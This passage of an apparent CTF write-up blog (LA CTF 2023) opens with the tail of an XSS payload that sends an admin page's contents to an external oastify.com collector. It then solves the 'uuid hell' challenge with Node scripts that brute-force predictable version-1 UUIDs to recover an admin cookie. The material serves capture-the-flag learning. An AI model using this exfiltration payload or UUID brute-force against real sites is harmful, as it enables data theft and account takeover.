        <span class="kd">let</span> <span class="nx">report</span> <span class="o">=</span> <span class="nx">webs</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span><span class="dl">"</span><span class="s2">https://uhf0hn49b3o3wmk345uavj0n0e65uvik.oastify.com/?flag=</span><span class="dl">"</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">report</span><span class="p">);</span>
    <span class="p">},</span> <span class="mi">200</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">redirect</span><span class="p">()</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Sending the URL of <code class="language-plaintext highlighter-rouge">FILE 2</code> to admin will get us the flag.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web6.png" alt="" data-proofer-ignore></p><p>Flag : <code class="language-plaintext highlighter-rouge">lactf{m4yb3_g1v1ng_fr33_xss_1s_jus7_4_b4d_1d3a}</code></p><p><strong>References</strong></p><ol><li><a href="https://www.youtube.com/watch?v=1AmbQU_p5TU">https://www.youtube.com/watch?v=1AmbQU_p5TU</a></ol><h4 id="web--uuid-hell"><span class="mr-2">Web : uuid hell</span><a href="#web--uuid-hell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>UUIDs are the best! I love them (if you couldn’t tell)!</p><p>Link: <a href="https://uuid-hell.lac.tf/">https://uuid-hell.lac.tf/</a></p></blockquote><p><strong>Zip file (uuid-hell.zip)</strong> : <a href="https://github.com/uclaacm/lactf-archive/blob/main/2023/web/uuid-hell/uuid-hell.zip">uuid-hell.zip</a></p><p>Inside <code class="language-plaintext highlighter-rouge">server.js</code> we can view the source code of the web application. The code sets up the following routes:</p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/</code>: This route used to display a unique identifier for the user and the hashes of the UUIDs of all users and admin users. If the user has a valid UUID cookie, it is checked to see if it is an admin UUID. If it is, the flag is returned, otherwise, the user is shown their UUID and the hashes of the UUIDs of all users and admin users.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/createadmin</code>: This route is a POST endpoint that creates a new “admin” UUID and adds it to the list of admin UUIDs. This endpoint is used to create an admin account.</p></div></blockquote><p>Every time an admin is created through the <code class="language-plaintext highlighter-rouge">/createadmin</code> route, a new UUID is added to their list. Let’s take a look at the latest <code class="language-plaintext highlighter-rouge">MD5</code> for an admin.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web8.png" alt="" data-proofer-ignore></p><p>Let’s create and admin and view the latest <code class="language-plaintext highlighter-rouge">MD5</code>. The pink color indicates, the previous value of <code class="language-plaintext highlighter-rouge">MD5</code>, while yellow color indicates the latest value of <code class="language-plaintext highlighter-rouge">MD5</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-X</span> POST <span class="s2">"https://uuid-hell.lac.tf/createadmin"</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web9.png" alt="" data-proofer-ignore></p><p>The hash created in <code class="language-plaintext highlighter-rouge">getUsers()</code> function.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">adminuuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>

<span class="dl">"</span><span class="s2">fefc766eb7572078650ddfad91f2021b</span><span class="dl">"</span> <span class="o">=</span> <span class="nx">MD5</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="o">+</span><span class="nx">Admin_UUID</span><span class="p">)</span>
</pre></table></code></div></div><p>Next, we need to know how the Admin UUID created. These codes, will help us understand how the UUID created. The admin UUID is created in the <code class="language-plaintext highlighter-rouge">randomUUID()</code> function and assigned to <code class="language-plaintext highlighter-rouge">adminid</code> in the <code class="language-plaintext highlighter-rouge">/createadmin</code> route.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">randomUUID</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">({</span><span class="dl">'</span><span class="s1">node</span><span class="dl">'</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">],</span> <span class="dl">'</span><span class="s1">clockseq</span><span class="dl">'</span><span class="p">:</span> <span class="mb">0b10101001100100</span><span class="p">});</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/createadmin</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

    <span class="kd">const</span> <span class="nx">adminid</span> <span class="o">=</span> <span class="nx">randomUUID</span><span class="p">();</span>
    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">adminid</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">adminuuids</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Admin account created.</span><span class="dl">"</span><span class="p">)</span>
<span class="p">});</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">uuid v1</code>: A version 1 UUID is generated by using the combination of the <code class="language-plaintext highlighter-rouge">current time</code>, a <code class="language-plaintext highlighter-rouge">MAC address</code> of a network card (or a <code class="language-plaintext highlighter-rouge">random value</code> if the MAC address is not available), and a <code class="language-plaintext highlighter-rouge">random number</code>. This ensures that the UUID generated is unique across time and space</p></div></blockquote><p>I made 2 scripts <code class="language-plaintext highlighter-rouge">fetch_hash.js</code> and <code class="language-plaintext highlighter-rouge">offline_brute.js</code>.</p><p><strong>FILE 1 (fetch_hash.js)</strong></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">uuid</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">axios</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">axios</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Create admin</span>
<span class="kd">const</span> <span class="nx">url_post</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://uuid-hell.lac.tf/createadmin</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url_post</span><span class="p">,</span> <span class="p">{</span>
  <span class="c1">// Request body goes here</span>
<span class="p">})</span>
  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
  <span class="p">})</span>
  <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
  <span class="p">});</span>

<span class="c1">// Get latest hash value</span>
<span class="kd">const</span> <span class="nx">url_get</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://uuid-hell.lac.tf/</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">regex</span> <span class="o">=</span> <span class="sr">/:</span><span class="se">(</span><span class="sr">.*</span><span class="se">)</span><span class="sr">&lt;br/</span><span class="nx">s</span>
<span class="kd">const</span> <span class="nx">regex2</span> <span class="o">=</span> <span class="sr">/</span><span class="se">((</span><span class="sr">.*</span><span class="se">(\n</span><span class="sr">|</span><span class="se">\r</span><span class="sr">|</span><span class="se">\r\n)){2})</span><span class="sr">/</span><span class="nx">s</span>
<span class="kd">let</span> <span class="nx">hash_web</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
<span class="nx">axios</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">url_get</span><span class="p">)</span>
  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">responseData</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">responseData</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">regex</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="nx">hash_web</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">regex2</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;tr&gt;&lt;td&gt;</span><span class="dl">"</span><span class="p">,</span><span class="dl">""</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;</span><span class="dl">"</span><span class="p">,</span><span class="dl">""</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">MD5 Hash (Web) : </span><span class="dl">"</span><span class="o">+</span><span class="nx">hash_web</span><span class="p">);</span>
  <span class="p">})</span>
  <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
  <span class="p">});</span>

</pre></table></code></div></div><p><strong>FILE 2 (fetch_hash.js)</strong></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">uuid</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">axios</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">axios</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Arguments</span>
<span class="kd">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">;</span>

<span class="c1">// Bruteforcing</span>
<span class="kd">const</span> <span class="nx">currentTimestamp</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">timestamp</span> <span class="o">=</span> <span class="nx">currentTimestamp</span><span class="o">-</span><span class="mi">100000</span><span class="p">;</span> <span class="nx">timestamp</span> <span class="o">&lt;=</span> <span class="nx">currentTimestamp</span><span class="o">+</span><span class="mi">100000</span><span class="p">;</span> <span class="nx">timestamp</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">// Generate UUID</span>
	<span class="kd">const</span> <span class="nx">adminuuid</span> <span class="o">=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">({</span>
		<span class="na">msecs</span><span class="p">:</span> <span class="nx">timestamp</span><span class="p">,</span>
		<span class="na">node</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">],</span>
		<span class="na">clockseq</span><span class="p">:</span> <span class="mb">0b10101001100100</span><span class="p">,</span>
	<span class="p">});</span>
	
	<span class="c1">// MD5 Hash</span>
	<span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">adminuuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
	
	<span class="c1">// Compare MD5 hash we generate with the one we found in web</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">hash</span> <span class="o">===</span> <span class="nx">args</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="p">{</span>
			<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Original Hash : </span><span class="dl">"</span><span class="o">+</span><span class="nx">hash</span><span class="p">);</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Admin UUID : </span><span class="dl">"</span><span class="o">+</span><span class="nx">adminuuid</span><span class="p">);</span>
	
			<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We can easily get the admin <code class="language-plaintext highlighter-rouge">UUID</code> with the following steps:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># node fetch_hash.js   </span>
Admin account created.
MD5 Hash <span class="o">(</span>Web<span class="o">)</span> : 18664ca27547b38777fa7ef42fbdc5d5

<span class="c"># node offline_brute.js "18664ca27547b38777fa7ef42fbdc5d5"</span>
Original Hash : 18664ca27547b38777fa7ef42fbdc5d5
Admin UUID : 7c9e4360-ac19-11ed-aa64-67696e6b6f69
</pre></table></code></div></div><p>Change the <code class="language-plaintext highlighter-rouge">cookies</code> and we will get the flag!</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web10.png" alt="" data-proofer-ignore></p><p>Flag : <code class="language-plaintext highlighter-rouge">lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=LA+CTF+2023+-+Writeup+-+%24%28H0j3n%29&url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FLACTF-2023-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=LA+CTF+2023+-+Writeup+-+%24%28H0j3n%29&u=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FLACTF-2023-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FLACTF-2023-Writeup%2F&text=LA+CTF+2023+-+Writeup+-+%24%28H0j3n%29" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ImaginaryCTF-2024/">ImaginaryCTF 2024 [WEB]</a><li><a href="/posts/DownUnderCTF-2024/">DownUnderctf 2024 [WEB]</a><li><a href="/posts/IntigritiCTF-2023-Writeup/">Intigriti CTF 2023 Writeup [WEB]</a><li><a href="/posts/TCP1PCTF-2023-Web-Unsecure/">TCP1PCTF 2023 - Un Secure [WEB]</a><li><a href="/posts/Offensive-Security-Experienced-Pentester-OSEP-Review/">Offensive Security Experienced Pentester OSEP Review</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTM-CTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1676764800" data-df="ll" > Feb 19, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTM CTF 2023 - Writeup</h3><div class="text-muted small"><p> This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved durin...</p></div></div></a></div><div class="card"> <a href="/posts/TJCTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1685145600" data-df="ll" > May 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TJCTF 2023 - Writeup</h3><div class="text-muted small"><p> Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year. Link to archive cha...</p></div></div></a></div><div class="card"> <a href="/posts/Intigriti-Challenge-1021-Writeup/"><div class="card-body"> <em class="small" data-ts="1685664000" data-df="ll" > Jun 2, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Intigriti - Challenge 1021 Writeup</h3><div class="text-muted small"><p> This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overvie...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Pwnable-kr-collision/" class="btn btn-outline-primary" prompt="Older"><p>Pwnable.kr - collision (Toddler’s Bottle)</p></a> <a href="/posts/FlareOn-02-2015-Challenge-1/" class="btn btn-outline-primary" prompt="Newer"><p>FlareOn2 2015 - Challenge 1</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/h0j3n">H0j3n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
